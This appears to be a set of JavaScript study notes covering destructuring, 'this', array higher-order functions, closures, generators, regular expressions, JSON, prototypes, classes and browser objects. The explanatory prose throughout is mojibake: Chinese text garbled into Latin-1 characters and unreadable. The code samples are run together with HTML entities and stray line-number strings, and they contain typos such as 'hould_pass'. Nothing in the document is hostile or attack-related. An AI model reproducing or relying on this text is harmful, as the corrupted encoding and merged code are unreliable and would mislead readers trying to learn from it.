å¦‚æœéœ€è¦ä»ä¸€ä¸ªå¯¹è±¡ä¸­å–å‡ºè‹¥å¹²å±æ€§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è§£æ„èµ‹å€¼ï¼Œä¾¿äºå¿«é€Ÿè·å–å¯¹è±¡çš„æŒ‡å®šå±æ€§ã€‚ 12345678910111213var person = &#123; name : 'xiaoming', age : 18, university : &#123; specialities : 'cs' &#125;&#125;;//ç›´æ¥èµ‹å€¼var &#123;name,age&#125; = person;//åµŒå¥—å¯¹è±¡çš„èµ‹å€¼var &#123;university : &#123;specialities&#125;&#125; = person;//å¦‚æœæƒ³è¦çš„å˜é‡å’Œå¯¹è±¡çš„å±æ€§åä¸ä¸€æ ·ï¼Œå¯ä»¥å¦‚ä¸‹æ“ä½œvar &#123;name:mz&#125; = person; ä½¿ç”¨åœºæ™¯ï¼šè§£æ„èµ‹å€¼åœ¨å¾ˆå¤šæ—¶å€™å¯ä»¥å¤§å¤§ç®€åŒ–ä»£ç ã€‚ä¾‹å¦‚ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡xå’Œyçš„å€¼ï¼Œå¯ä»¥è¿™ä¹ˆå†™ï¼Œä¸å†éœ€è¦ä¸´æ—¶å˜é‡ã€‚ 12var x &#x3D; 1,y &#x3D; 2;[x , y] &#x3D; [y ,x]; å¦‚æœä¸€ä¸ªå‡½æ•°æ¥æ”¶ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨è§£æ„ç›´æ¥æŠŠå¯¹è±¡çš„å±æ€§ç»‘å®šåˆ°å˜é‡ä¸­ã€‚ æ–¹æ³•åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ç»‘å®šå‡½æ•°ï¼Œç§°ä¸ºè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•ã€‚ åœ¨ä¸€ä¸ªæ–¹æ³•å†…éƒ¨ï¼Œthisæ˜¯ä¸€ä¸ªç‰¹æ®Šå˜é‡ï¼Œå®ƒå§‹ç»ˆæŒ‡å‘å½“å‰å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯xiaomingè¿™ä¸ªå˜é‡ã€‚æ‰€ä»¥ï¼Œthis.birthå¯ä»¥æ‹¿åˆ°xiaomingçš„birthå±æ€§ã€‚ 12345678910111213function getAge() &#123; var y = new Date().getFullYear(); return y - this.birth;&#125;var xiaoming = &#123; name: 'å°æ˜', birth: 1990, age: getAge&#125;;xiaoming.age(); // 30, æ­£å¸¸ç»“æœgetAge(); // NaN å¦‚æœä»¥å¯¹è±¡çš„æ–¹æ³•å½¢å¼è°ƒç”¨ï¼Œæ¯”å¦‚xiaoming.age()ï¼Œè¯¥å‡½æ•°çš„thisæŒ‡å‘è¢«è°ƒç”¨çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯xiaomingï¼Œè¿™æ˜¯ç¬¦åˆæˆ‘ä»¬é¢„æœŸçš„ã€‚ å¦‚æœå•ç‹¬è°ƒç”¨å‡½æ•°ï¼Œæ¯”å¦‚getAge()ï¼Œæ­¤æ—¶ï¼Œè¯¥å‡½æ•°çš„thisæŒ‡å‘å…¨å±€å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯windowã€‚ 123456789101112131415â€˜use strictâ€™;var xiaoming = &#123; name : 'xiaoming', age : 18, math : 90, en : 99, grades : function()&#123; var that = this; //æ•æ‰thisæŒ‡é’ˆ function getGrades()&#123; //è¿›è¡Œé‡æ„ return that.math+that.en; &#125; return getGrades(); &#125;&#125; é«˜é˜¶å‡½æ•°mapç”±äºmap()æ–¹æ³•å®šä¹‰åœ¨JavaScriptçš„Arrayä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨Arrayçš„map()æ–¹æ³•ï¼Œä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„å‡½æ•°ï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªæ–°çš„Arrayä½œä¸ºç»“æœã€‚ 123var arr = [1,2,3];arr.map(x=&gt;x*2); //[2,4,6]arr.map(function(x)&#123;return x*2;&#125;); //[2,4,6] reducerrayçš„reduce()æŠŠä¸€ä¸ªå‡½æ•°ä½œç”¨åœ¨è¿™ä¸ªArrayçš„[x1, x2, x3...]ä¸Šï¼Œè¿™ä¸ªå‡½æ•°å¿…é¡»æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œreduce()æŠŠç»“æœç»§ç»­å’Œåºåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ åšç´¯ç§¯è®¡ç®—ã€‚ 1234567var arr = [x1,x2,x3,x4];arr.reduce((x,y)=&gt;(x+y)); //x1+x2+x3+x4var arr = [1, 3, 5, 7, 9];arr.reduce(function (x, y) &#123; return x * 10 + y;&#125;); // 13579 filterfilterä¹Ÿæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ“ä½œï¼Œå®ƒç”¨äºæŠŠArrayçš„æŸäº›å…ƒç´ è¿‡æ»¤æ‰ï¼Œç„¶åè¿”å›å‰©ä¸‹çš„å…ƒç´ ã€‚ 12345var arr = [1,2,3,4,5];var r = arr.filter(function(x)&#123; return x%2 !=0;&#125;)console.log(r); sortjsä¸­æ’åºç®—æ³•æ˜¯å…ˆæŠŠæ‰€æœ‰å…ƒç´ å…ˆè½¬æ¢ä¸ºStringå†æŒ‰ç…§asciiç æ’åºã€‚ 12345678var arr &#x3D; [10,20,1,2];var r &#x3D; arr.sort(function(x,y)&#123; if(x&lt;y)return 1; else if(x&gt;y)return -1; return 0;&#125;)console.log(arr) &#x2F;&#x2F;[20,10,2,1]console.log(r) &#x2F;&#x2F;[20,10,2,1] sort()æ–¹æ³•ä¼šç›´æ¥å¯¹Arrayè¿›è¡Œä¿®æ”¹ï¼Œå®ƒè¿”å›çš„ç»“æœä»æ˜¯å½“å‰Arrayã€‚ é—­åŒ…å‡½æ•°ä½œä¸ºè¿”å›å€¼ 1234567891011function lazy_sum(arr) &#123; var sum = function () &#123; return arr.reduce(function (x, y) &#123; return x + y; &#125;); &#125; return sum;&#125;var f = lazy_sum([1,2,3,4]);f; //fæ˜¯è¿”å›sumå‡½æ•°æœ¬èº«f(); //f()æ‰æ˜¯è°ƒç”¨å‡½æ•° ç®­å¤´å‡½æ•°1234567891011121314//æ— &#123;&#125;çš„x =&gt; x*xfunction (x)&#123; return x*x;&#125;//è¿”å›å¤šæ¡x =&gt; &#123; ... return ; ... return ;&#125;//å¤šä¸ªå‚æ•°(x,y) =&gt; x*x+y*y//è¿”å›å¯¹è±¡x =&gt; (&#123;foo:x&#125;); generatorgeneratorç”±function*å®šä¹‰ï¼ˆæ³¨æ„å¤šå‡ºçš„*å·ï¼‰ï¼Œå¹¶ä¸”ï¼Œé™¤äº†returnè¯­å¥ï¼Œè¿˜å¯ä»¥ç”¨yieldè¿”å›å¤šæ¬¡ã€‚ 123456function* foo(x)&#123; yield x+1; yield x+2; return x+3;&#125;foo(2); è°ƒç”¨generatorå¯¹è±¡æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œ ä¸€æ˜¯ä¸æ–­åœ°è°ƒç”¨generatorå¯¹è±¡çš„next()æ–¹æ³•next()æ–¹æ³•ä¼šæ‰§è¡Œgeneratorçš„ä»£ç ï¼Œç„¶åï¼Œæ¯æ¬¡é‡åˆ°yield x;å°±è¿”å›ä¸€ä¸ªå¯¹è±¡{value: x, done: true/false}ï¼Œç„¶åâ€œæš‚åœâ€ã€‚è¿”å›çš„valueå°±æ˜¯yieldçš„è¿”å›å€¼ï¼Œdoneè¡¨ç¤ºè¿™ä¸ªgeneratoræ˜¯å¦å·²ç»æ‰§è¡Œç»“æŸäº†ã€‚å¦‚æœdoneä¸ºtrueï¼Œåˆ™valueå°±æ˜¯returnçš„è¿”å›å€¼ã€‚ ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯ç›´æ¥ç”¨for ... ofå¾ªç¯è¿­ä»£generatorå¯¹è±¡ï¼Œè¿™ç§æ–¹å¼ä¸éœ€è¦æˆ‘ä»¬è‡ªå·±åˆ¤æ–­doneã€‚ 12345678910//ç¬¬ä¸€ç§var f = foo(2);f.next() //&#123;value: 3, done: false&#125;f.next() //&#123;value: 4, done: false&#125;f.next() //&#123;value: 5, done: true&#125;f.next() //&#123;value: undefined, done: true&#125;//ç¬¬äºŒç§for(var x of foo(2))&#123; console.log(x);&#125; //3,4 æ ‡å‡†å¯¹è±¡ ä¸è¦ä½¿ç”¨new Number()ã€new Boolean()ã€new String()åˆ›å»ºåŒ…è£…å¯¹è±¡ï¼› ç”¨parseInt()æˆ–parseFloat()æ¥è½¬æ¢ä»»æ„ç±»å‹åˆ°numberï¼› ç”¨String()æ¥è½¬æ¢ä»»æ„ç±»å‹åˆ°stringï¼Œæˆ–è€…ç›´æ¥è°ƒç”¨æŸä¸ªå¯¹è±¡çš„toString()æ–¹æ³•ï¼› é€šå¸¸ä¸å¿…æŠŠä»»æ„ç±»å‹è½¬æ¢ä¸ºbooleanå†åˆ¤æ–­ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥å†™if (myVar) {...}ï¼› typeofæ“ä½œç¬¦å¯ä»¥åˆ¤æ–­å‡ºnumberã€booleanã€stringã€functionå’Œundefinedï¼› åˆ¤æ–­Arrayè¦ä½¿ç”¨Array.isArray(arr)ï¼› åˆ¤æ–­nullè¯·ä½¿ç”¨myVar === nullï¼› åˆ¤æ–­æŸä¸ªå…¨å±€å˜é‡æ˜¯å¦å­˜åœ¨ç”¨typeof window.myVar === &#39;undefined&#39;ï¼› å‡½æ•°å†…éƒ¨åˆ¤æ–­æŸä¸ªå˜é‡æ˜¯å¦å­˜åœ¨ç”¨typeof myVar === &#39;undefined&#39;ã€‚ Dateåœ¨JavaScriptä¸­ï¼ŒDateå¯¹è±¡ç”¨æ¥è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ã€‚ 1234var now &#x3D; new Date();now.getMilliseconds(); &#x2F;&#x2F;æ¯«ç§’æ•°now.getTime(); &#x2F;&#x2F;æ—¶é—´æˆ³var d &#x3D; new Date(2020,6,30,8,39,30,123) &#x2F;&#x2F;è‡ªå®šä¹‰æ—¶é—´ RegExpåŸºç¡€\\då¯ä»¥åŒ¹é…ä¸€ä¸ªæ•°å­— \\wå¯ä»¥åŒ¹é…ä¸€ä¸ªå­—æ¯æˆ–æ•°å­— .å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ *è¡¨ç¤ºä»»æ„ä¸ªå­—ç¬¦ +è¡¨ç¤ºè‡³å°‘ä¸€ä¸ªå­—ç¬¦ ?è¡¨ç¤º0ä¸ªæˆ–1ä¸ªå­—ç¬¦ {n}è¡¨ç¤ºnä¸ªå­—ç¬¦ {n,m}è¡¨ç¤ºn-mä¸ªå­—ç¬¦ è¿›é˜¶è¦åšæ›´ç²¾ç¡®åœ°åŒ¹é…ï¼Œå¯ä»¥ç”¨[]è¡¨ç¤ºèŒƒå›´ [0-9a-zA-Z\\_]å¯ä»¥åŒ¹é…ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ï¼› [0-9a-zA-Z\\_]+å¯ä»¥åŒ¹é…è‡³å°‘ç”±ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚&#39;a100&#39;ï¼Œ&#39;0_Z&#39;ï¼Œ&#39;js2015&#39;ç­‰ç­‰ï¼› [a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]*å¯ä»¥åŒ¹é…ç”±å­—æ¯æˆ–ä¸‹åˆ’çº¿ då·å¼€å¤´ï¼Œåæ¥ä»»æ„ä¸ªç”±ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ då·ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯JavaScriptå…è®¸çš„å˜é‡åï¼› [a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]{0, 19}æ›´ç²¾ç¡®åœ°é™åˆ¶äº†å˜é‡çš„é•¿åº¦æ˜¯1-20ä¸ªå­—ç¬¦ï¼ˆå‰é¢1ä¸ªå­—ç¬¦+åé¢æœ€å¤š19ä¸ªå­—ç¬¦ï¼‰ã€‚ A|Bå¯ä»¥åŒ¹é…Aæˆ–B ^è¡¨ç¤ºè¡Œçš„å¼€å¤´ï¼Œ^\\dè¡¨ç¤ºå¿…é¡»ä»¥æ•°å­—å¼€å¤´ã€‚ $è¡¨ç¤ºè¡Œçš„ç»“æŸï¼Œ\\d$è¡¨ç¤ºå¿…é¡»ä»¥æ•°å­—ç»“æŸã€‚ jsæ­£åˆ™JavaScriptæœ‰ä¸¤ç§æ–¹å¼åˆ›å»ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š ç¬¬ä¸€ç§æ–¹å¼æ˜¯ç›´æ¥é€šè¿‡/æ­£åˆ™è¡¨è¾¾å¼/å†™å‡ºæ¥ï¼Œç¬¬äºŒç§æ–¹å¼æ˜¯é€šè¿‡new RegExp(&#39;æ­£åˆ™è¡¨è¾¾å¼&#39;)åˆ›å»ºä¸€ä¸ªRegExpå¯¹è±¡ã€‚ 1234&#x2F;&#x2F;ç¬¬ä¸€ç§var re1 &#x3D; &#x2F;ABC&#x2F;;&#x2F;&#x2F;ç¬¬äºŒç§var re2 &#x3D; new RegExp(&#39;ABC&#39;); RegExpå¯¹è±¡çš„test()æ–¹æ³•ç”¨äºæµ‹è¯•ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆæ¡ä»¶ã€‚ 12re2.test(&#39;ABC&#39;); &#x2F;&#x2F;truere2.test(&#39;abc&#39;); &#x2F;&#x2F; false åˆ‡åˆ†å­—ç¬¦ä¸² 1234'a b c'.split(' '); // ['a', 'b', '', '', 'c']'a b c'.split(/\\s+/); // ['a', 'b', 'c']'a,b, c d'.split(/[\\s\\,]+/); // ['a', 'b', 'c', 'd']'a,b;; c d'.split(/[\\s\\,\\;]+/); // ['a', 'b', 'c', 'd'] åˆ†ç»„ ç”¨()è¡¨ç¤ºçš„å°±æ˜¯è¦æå–çš„åˆ†ç»„ï¼ˆGroupï¼‰ 123var re = /^(\\d&#123;3&#125;)-(\\d&#123;3,8&#125;)$/;re.exec('010-12345'); // ['010-12345', '010', '12345']re.exec('010 12345'); // null å¦‚æœæ­£åˆ™è¡¨è¾¾å¼ä¸­å®šä¹‰äº†ç»„ï¼Œå°±å¯ä»¥åœ¨RegExpå¯¹è±¡ä¸Šç”¨exec()æ–¹æ³•æå–å‡ºå­ä¸²æ¥ã€‚ exec()æ–¹æ³•åœ¨åŒ¹é…æˆåŠŸåï¼Œä¼šè¿”å›ä¸€ä¸ªArrayï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œåé¢çš„å­—ç¬¦ä¸²è¡¨ç¤ºåŒ¹é…æˆåŠŸçš„å­ä¸²ã€‚ exec()æ–¹æ³•åœ¨åŒ¹é…å¤±è´¥æ—¶è¿”å›nullã€‚ *è´ªå©ªåŒ¹é…éœ€è¦ç‰¹åˆ«æŒ‡å‡ºçš„æ˜¯ï¼Œæ­£åˆ™åŒ¹é…é»˜è®¤æ˜¯è´ªå©ªåŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼ŒåŒ¹é…å‡ºæ•°å­—åé¢çš„0ï¼š 12var re &#x3D; &#x2F;^(\\d+)(0*)$&#x2F;;re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;] ç”±äº\\d+é‡‡ç”¨è´ªå©ªåŒ¹é…ï¼Œç›´æ¥æŠŠåé¢çš„0å…¨éƒ¨åŒ¹é…äº†ï¼Œç»“æœ0*åªèƒ½åŒ¹é…ç©ºå­—ç¬¦ä¸²äº†ã€‚ å¿…é¡»è®©\\d+é‡‡ç”¨éè´ªå©ªåŒ¹é…ï¼ˆä¹Ÿå°±æ˜¯å°½å¯èƒ½å°‘åŒ¹é…ï¼‰ï¼Œæ‰èƒ½æŠŠåé¢çš„0åŒ¹é…å‡ºæ¥ï¼ŒåŠ ä¸ª?å°±å¯ä»¥è®©\\d+é‡‡ç”¨éè´ªå©ªåŒ¹é…ï¼š 12var re &#x3D; &#x2F;^(\\d+?)(0*)$&#x2F;;re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;] å…¨å±€æœç´¢ JavaScriptçš„æ­£åˆ™è¡¨è¾¾å¼è¿˜æœ‰å‡ ä¸ªç‰¹æ®Šçš„æ ‡å¿—ï¼Œæœ€å¸¸ç”¨çš„æ˜¯gï¼Œè¡¨ç¤ºå…¨å±€åŒ¹é…ã€‚æ­£åˆ™è¡¨è¾¾å¼è¿˜å¯ä»¥æŒ‡å®šiæ ‡å¿—ï¼Œè¡¨ç¤ºå¿½ç•¥å¤§å°å†™ï¼Œmæ ‡å¿—ï¼Œè¡¨ç¤ºæ‰§è¡Œå¤šè¡ŒåŒ¹é…ã€‚ ä½œä¸š 1234567//è¯·å°è¯•å†™ä¸€ä¸ªéªŒè¯Emailåœ°å€çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚var re = /^[0-9a-zA-Z\\.]+\\@[0-9a-zA-Z]+\\.(com|org)$/;hould_pass = ['someone@gmail.com', 'bill.gates@microsoft.com', 'tom@voyager.org', 'bob2015@163.com'], should_fail = ['test#gmail.com', 'bill@microsoft', 'bill%gates@ms.com', '@voyager.org'];//éªŒè¯å¹¶æå–å‡ºå¸¦åå­—çš„Emailåœ°å€var re = /^\\&lt;(\\w+\\s+\\w+)\\&gt; (\\w+\\.*\\@\\w+\\.+\\w+)$/;shoule_pass = '&lt;Tom Paris&gt; tom@voyager.org'; å†™æ­£åˆ™é¦–å…ˆè¦æ³¨æ„è½¬ä¹‰å¦‚ï¼š\\s ,\\w,\\d å¤§å°å†™ç”¨iæ ‡å¿— JSON numberï¼šå’ŒJavaScriptçš„numberå®Œå…¨ä¸€è‡´ï¼› booleanï¼šå°±æ˜¯JavaScriptçš„trueæˆ–falseï¼› stringï¼šå°±æ˜¯JavaScriptçš„stringï¼› nullï¼šå°±æ˜¯JavaScriptçš„nullï¼› arrayï¼šå°±æ˜¯JavaScriptçš„Arrayè¡¨ç¤ºæ–¹å¼â€”â€”[]ï¼› objectï¼šå°±æ˜¯JavaScriptçš„{ ... }è¡¨ç¤ºæ–¹å¼ã€‚ ä¸ºäº†ç»Ÿä¸€è§£æï¼ŒJSONçš„å­—ç¬¦ä¸²è§„å®šå¿…é¡»ç”¨åŒå¼•å·&quot;&quot;ï¼ŒObjectçš„é”®ä¹Ÿå¿…é¡»ç”¨åŒå¼•å·&quot;&quot;ã€‚ åºåˆ—åŒ–123456789101112131415var xiaoming = &#123; name: 'xiaoming', age: 14, height: 165&#125;var s = JSON.stringify(xiaoming);console.log(s); //&#123;\"name\":\"xiaoming\",\"age\":14,\"height\":165&#125;var s = JSON.stringify(xiaoming,null,' '); console.log(s); //\"&#123; \"name\": \"xiaoming\", \"age\": 14, \"height\": 165&#125;\"//stringify(a,b,c)//aä¸ºå¯¹è±¡åï¼Œbä¸ºæŒ‡å®šçš„å±æ€§æˆ–è€…ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå¦‚['age','name'],cä¸º' 'ä»£è¡¨é€è¡Œè¾“å‡º ååºåˆ—åŒ–æ‹¿åˆ°ä¸€ä¸ªJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨JSON.parse()æŠŠå®ƒå˜æˆä¸€ä¸ªJavaScriptå¯¹è±¡ã€‚ JSON.parse()è¿˜å¯ä»¥æ¥æ”¶ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è½¬æ¢è§£æå‡ºçš„å±æ€§ã€‚ 123456JSON.parse('&#123;\"name\":\"å°æ˜\",\"age\":14&#125;'); // Object &#123;name: 'å°æ˜', age: 14&#125;//æ¥å—å‡½æ•°var obj = JSON.parse('&#123;\"name\":\"å°æ˜\",\"age\":14&#125;',function(key,value)&#123; if (key ==='name')&#123;return value + 'åŒå­¦'&#125; else return value;&#125;); é¢å‘å¯¹è±¡ç¼–ç¨‹åœ¨jsä¸­æ²¡æœ‰ç±»çš„æ¦‚å¿µï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½æ˜¯å®ä¾‹ï¼Œç»§æ‰¿å…³ç³»ä¸è¿‡æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡çš„åŸå‹æŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡è€Œå·²ã€‚ 1234567891011121314151617181920&#x2F;&#x2F; åŸå‹å¯¹è±¡:var Student &#x3D; &#123; name: &#39;Robot&#39;, height: 1.2, run: function () &#123; console.log(this.name + &#39; is running...&#39;); &#125;&#125;;function createStudent(name) &#123; &#x2F;&#x2F; åŸºäºStudentåŸå‹åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡: var s &#x3D; Object.create(Student); &#x2F;&#x2F; åˆå§‹åŒ–æ–°å¯¹è±¡: s.name &#x3D; name; return s;&#125;var xiaoming &#x3D; createStudent(&#39;å°æ˜&#39;);xiaoming.run(); &#x2F;&#x2F; å°æ˜ is running...xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true åˆ›å»ºå¯¹è±¡JavaScriptå¯¹æ¯ä¸ªåˆ›å»ºçš„å¯¹è±¡éƒ½ä¼šè®¾ç½®ä¸€ä¸ªåŸå‹ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹å¯¹è±¡ã€‚ å½“æˆ‘ä»¬ç”¨obj.xxxè®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼ŒJavaScriptå¼•æ“å…ˆåœ¨å½“å‰å¯¹è±¡ä¸ŠæŸ¥æ‰¾è¯¥å±æ€§ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±åˆ°å…¶åŸå‹å¯¹è±¡ä¸Šæ‰¾ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¸€ç›´ä¸Šæº¯åˆ°Object.prototypeå¯¹è±¡ï¼Œæœ€åï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±åªèƒ½è¿”å›undefinedã€‚ æ„é€ å‡½æ•° é™¤äº†ç›´æ¥ç”¨{ ... }åˆ›å»ºä¸€ä¸ªå¯¹è±¡å¤–ï¼ŒJavaScriptè¿˜å¯ä»¥ç”¨ä¸€ç§æ„é€ å‡½æ•°çš„æ–¹æ³•æ¥åˆ›å»ºå¯¹è±¡ã€‚å®ƒçš„ç”¨æ³•æ˜¯ï¼Œå…ˆå®šä¹‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼š 1234567function Student(name) &#123; this.name &#x3D; name; this.hello &#x3D; function () &#123; alert(&#39;Hello, &#39; + this.name + &#39;!&#39;); &#125;&#125;var xiaoming &#x3D; new Student(&#39;xiaoming&#39;) å†™äº†newï¼Œå®ƒå°±å˜æˆäº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒç»‘å®šçš„thisæŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œå¹¶é»˜è®¤è¿”å›thisï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸éœ€è¦åœ¨æœ€åå†™return this; åŸå‹é“¾ï¼š 1234567891011&#x2F;&#x2F;å¸¸ç”¨åˆ›å»ºå¯¹è±¡function Student(props)&#123; this.name &#x3D; props.name; this.grade &#x3D; props.grade;&#125;Student.prototype.hello &#x3D; function()&#123; alert(&#39;hello&#39;+this.name+&#39;.&#39;);&#125;function createStudent(props)&#123; return new Student(props);&#125; è¦è®©åˆ›å»ºçš„å¯¹è±¡å…±äº«ä¸€ä¸ªhelloå‡½æ•°ï¼Œæ ¹æ®å¯¹è±¡çš„å±æ€§æŸ¥æ‰¾åŸåˆ™ï¼Œæˆ‘ä»¬åªè¦æŠŠhelloå‡½æ•°ç§»åŠ¨åˆ°xiaomingã€xiaohongè¿™äº›å¯¹è±¡å…±åŒçš„åŸå‹ä¸Šå°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯Student.prototype åŸå‹ç»§æ‰¿12345678910111213function Student(props) &#123; this.name = props.name || 'Unnamed';&#125;Student.prototype.hello = function () &#123; alert('Hello, ' + this.name + '!');&#125;function PrimaryStudent(props) &#123; // è°ƒç”¨Studentæ„é€ å‡½æ•°ï¼Œç»‘å®šthiså˜é‡: Student.call(this, props); this.grade = props.grade || 1;&#125;new PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; Object.prototype ----&gt; null ç†è§£æ–°çš„åŸå‹é“¾ classç»§æ‰¿classåˆ›å»ºå¯¹è±¡ 1234567891011class Student &#123; constructor(name) &#123; this.name = name; &#125; hello() &#123; alert('Hello, ' + this.name + '!'); &#125;&#125;var xiaoming = new Student('xiaoming');xiaoming.hello(); classç»§æ‰¿ ç›´æ¥é€šè¿‡extendså®ç° 12345678910class PrimaryStudent extends Student &#123; constructor(name, grade) &#123; super(name); // è®°å¾—ç”¨superè°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•! this.grade = grade; &#125; myGrade() &#123; alert('I am at grade ' + this.grade); &#125;&#125; éœ€è¦é€šè¿‡super(name)æ¥è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œå¦åˆ™çˆ¶ç±»çš„nameå±æ€§æ— æ³•æ­£å¸¸åˆå§‹åŒ–ã€‚ æµè§ˆå™¨æµè§ˆå™¨å¯¹è±¡window windowå¯¹è±¡ä¸ä½†å……å½“å…¨å±€ä½œç”¨åŸŸï¼Œè€Œä¸”è¡¨ç¤ºæµè§ˆå™¨çª—å£ã€‚ innerWidth innerHeightå¯ä»¥è·å–æµè§ˆå™¨çª—å£çš„å†…éƒ¨é«˜åº¦å’Œå®½åº¦ outerWidth outerHeightè·å–æµè§ˆå™¨çª—å£çš„æ•´ä¸ªå®½é«˜ navigator navigatorå¯¹è±¡è¡¨ç¤ºæµè§ˆå™¨çš„ä¿¡æ¯ï¼Œæœ€å¸¸ç”¨çš„å±æ€§åŒ…æ‹¬ï¼š navigator.appNameï¼šæµè§ˆå™¨åç§°ï¼› navigator.appVersionï¼šæµè§ˆå™¨ç‰ˆæœ¬ï¼› navigator.languageï¼šæµè§ˆå™¨è®¾ç½®çš„è¯­è¨€ï¼› navigator.platformï¼šæ“ä½œç³»ç»Ÿç±»å‹ï¼› navigator.userAgentï¼šæµè§ˆå™¨è®¾å®šçš„User-Agentå­—ç¬¦ä¸²ã€‚ screenscreenå¯¹è±¡è¡¨ç¤ºå±å¹•çš„ä¿¡æ¯ï¼Œå¸¸ç”¨çš„å±æ€§æœ‰ï¼š screen.widthï¼šå±å¹•å®½åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼› screen.heightï¼šå±å¹•é«˜åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼› screen.colorDepthï¼šè¿”å›é¢œè‰²ä½æ•°ï¼Œå¦‚8ã€16ã€24ã€‚ locationlocationå¯¹è±¡è¡¨ç¤ºå½“å‰é¡µé¢çš„URLä¿¡æ¯ã€‚ 123456789location.href &#x2F;&#x2F;urllocation.protocol; &#x2F;&#x2F; &#39;http&#39;location.host; &#x2F;&#x2F; &#39;www.example.com&#39;location.port; &#x2F;&#x2F; &#39;8080&#39;location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;location.hash; &#x2F;&#x2F; &#39;TOP&#39;location.assign(&#39;...&#39;) &#x2F;&#x2F;åŠ è½½ä¸€ä¸ªæ–°çš„é¡µé¢location.reload() &#x2F;&#x2F;é‡æ–°åŠ è½½å½“å‰é¡µé¢ documentdocumentå¯¹è±¡è¡¨ç¤ºå½“å‰é¡µé¢ã€‚ç”±äºHTMLåœ¨æµè§ˆå™¨ä¸­ä»¥DOMå½¢å¼è¡¨ç¤ºä¸ºæ ‘å½¢ç»“æ„ï¼Œdocumentå¯¹è±¡å°±æ˜¯æ•´ä¸ªDOMæ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ ç”¨documentå¯¹è±¡æä¾›çš„getElementById()å’ŒgetElementsByTagName()å¯ä»¥æŒ‰IDè·å¾—ä¸€ä¸ªDOMèŠ‚ç‚¹å’ŒæŒ‰Tagåç§°è·å¾—ä¸€ç»„DOMèŠ‚ç‚¹ documentå¯¹è±¡è¿˜æœ‰ä¸€ä¸ªcookieå±æ€§ï¼Œå¯ä»¥è·å–å½“å‰é¡µé¢çš„Cookieã€‚JavaScriptå¯ä»¥é€šè¿‡document.cookieè¯»å–åˆ°å½“å‰é¡µé¢çš„Cookieã€‚ historyhistoryå¯¹è±¡ä¿å­˜äº†æµè§ˆå™¨çš„å†å²è®°å½•ï¼ŒJavaScriptå¯ä»¥è°ƒç”¨historyå¯¹è±¡çš„back()æˆ–forward 